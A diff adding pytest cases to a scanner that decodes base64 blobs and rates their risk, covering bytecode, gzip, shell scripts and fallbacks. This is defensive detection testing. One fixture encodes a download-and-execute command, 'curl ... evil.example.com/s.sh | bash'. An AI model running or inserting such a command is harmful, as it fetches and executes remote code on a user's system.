@@ -203,6 +203,118 @@ def test_swift_symbols_not_reported_as_base64():
 
 
 # ---------------------------------------------------------------------------
+# base64 decoded-content classification
+# ---------------------------------------------------------------------------
+
+def test_base64_classified_as_python_bytecode():
+    import base64 as b64
+
+    # Structural CPython bytecode shape: 2-byte version field + \r\n suffix,
+    # version-agnostic (avoids a magic-number table going stale).
+    payload = b"\x42\x0d\r\n" + bytes(range(64))
+    blob = b64.b64encode(payload).decode()
+    results = scan([blob])
+    assert len(results) == 1
+    assert results[0]["category"] == "encoded_python_bytecode"
+    assert results[0]["risk"] == Risk.HIGH
+
+
+def test_base64_classified_as_compressed_payload():
+    import base64 as b64
+
+    payload = b"\x1f\x8b" + bytes(range(64))  # gzip magic
+    blob = b64.b64encode(payload).decode()
+    results = scan([blob])
+    assert len(results) == 1
+    assert results[0]["category"] == "encoded_compressed_payload"
+    assert results[0]["risk"] == Risk.MEDIUM
+
+
+def test_base64_classified_as_encoded_script():
+    import base64 as b64
+
+    payload = b"#!/bin/bash\n" + bytes(range(64))
+    blob = b64.b64encode(payload).decode()
+    results = scan([blob])
+    assert len(results) == 1
+    assert results[0]["category"] == "encoded_script"
+    assert results[0]["risk"] == Risk.MEDIUM
+
+
+def test_base64_falls_back_to_generic_possible_base64():
+    """Regression guard: a validated base64 blob with no stronger sub-signal
+    must keep the unchanged generic classification."""
+    import base64 as b64
+
+    blob = b64.b64encode(bytes(range(64))).decode()
+    results = scan([blob])
+    assert len(results) == 1
+    assert results[0]["category"] == "possible_base64"
+    assert results[0]["risk"] == Risk.LOW
+
+
+def test_base64_recursively_classified_as_download_execute():
+    """Decoded text with no structural signal but a plain suspicious-string
+    match (curl | bash) must inherit that category/risk, not the generic
+    possible_base64/LOW fallback."""
+    import base64 as b64
+
+    cmd = "curl -fsSL http://evil.example.com/s.sh | bash and some padding text here"
+    blob = b64.b64encode(cmd.encode()).decode()
+    results = scan([blob])
+    assert len(results) == 1
+    assert results[0]["category"] == "download_execute"
+    assert results[0]["risk"] == Risk.HIGH
+    assert "found in decoded base64 content" in results[0]["description"]
+    assert results[0]["matched"] == blob
+
+
+def test_base64_non_utf8_decoded_bytes_skip_recursive_scan():
+    """Regression guard: decoded bytes that aren't valid UTF-8 text must not
+    attempt the recursive scan and must keep the generic fallback."""
+    import base64 as b64
+
+    bad = bytes([0xFF, 0xFE] + list(range(2, 64)))
+    with pytest.raises(UnicodeDecodeError):
+        bad.decode("utf-8")
+    blob = b64.b64encode(bad).decode()
+    results = scan([blob])
+    assert len(results) == 1
+    assert results[0]["category"] == "possible_base64"
+    assert results[0]["risk"] == Risk.LOW
+
+
+def test_base64_valid_text_with_no_suspicious_match_keeps_fallback():
+    import base64 as b64
+
+    plain = "just some ordinary benign padding text with no suspicious signal at all here"
+    blob = b64.b64encode(plain.encode()).decode()
+    results = scan([blob])
+    assert len(results) == 1
+    assert results[0]["category"] == "possible_base64"
+    assert results[0]["risk"] == Risk.LOW
+
+
+def test_base64_recursion_is_exactly_one_level_deep():
+    """A base64-shaped blob nested inside decoded text must not itself be
+    decoded and classified — otherwise this would report
+    encoded_compressed_payload (the inner blob's true content) instead of
+    the unclassified possible_base64 the one-level design specifies."""
+    import base64 as b64
+
+    inner_payload = b"\x1f\x8b" + bytes(range(64))  # gzip magic, if double-decoded
+    inner_blob = b64.b64encode(inner_payload).decode()
+    decoded_text = "start " + inner_blob + " end extra padding text to keep things reasonable"
+    outer_blob = b64.b64encode(decoded_text.encode()).decode()
+
+    results = scan([outer_blob])
+    assert len(results) == 1
+    assert results[0]["category"] == "possible_base64"
+    assert results[0]["risk"] == Risk.LOW
+    assert "found in decoded base64 content" in results[0]["description"]
+
+
+# ---------------------------------------------------------------------------
 # Error handling
 # ---------------------------------------------------------------------------
 
